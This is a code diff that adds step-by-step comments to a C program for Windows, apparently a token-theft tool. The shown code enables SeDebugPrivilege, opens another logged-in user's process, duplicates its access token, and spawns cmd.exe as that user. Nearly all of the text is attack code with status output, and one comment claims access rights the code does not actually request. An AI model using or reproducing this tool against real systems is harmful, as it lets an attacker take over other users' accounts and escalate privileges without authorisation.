@@ -36,6 +36,8 @@ int main(int argc, char* argv[]) {
 
     DWORD pid = atoi(argv[1]);
 
+// Step 1 - Enable 'SeDebugPrivilege'
+
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
         printf("[-] OpenProcessToken failed.\n");
@@ -50,6 +52,8 @@ int main(int argc, char* argv[]) {
     CloseHandle(hToken);
     printf("[+] SeDebugPrivilege enabled.\n");
 
+// Step 2 - Open the process belonging to the other logged-in Windows account with PROCESS_QUERY_INFORMATION & PROCESS_DUP_HANDLE rights
+
     HANDLE hTargetProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hTargetProc) {
         printf("[-] Failed to open target process.\n");
@@ -63,6 +67,8 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+ // Step 3 - Extract and duplicate the access token from that process.
+    
     HANDLE hDupToken;
     if (!DuplicateTokenEx(hTargetToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
         printf("[-] Failed to duplicate token.\n");
@@ -74,6 +80,8 @@ int main(int argc, char* argv[]) {
     STARTUPINFOW si = { sizeof(STARTUPINFOW) };
     PROCESS_INFORMATION pi;
 
+// Step 4 - Use it to spawn a new process 'cmd.exe' as the other logged-in Windows account (target user).
+    
     LPCWSTR cmdPath = L"C:\\Windows\\System32\\cmd.exe";
 
     if (!CreateProcessWithTokenW(hDupToken, 0, cmdPath, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
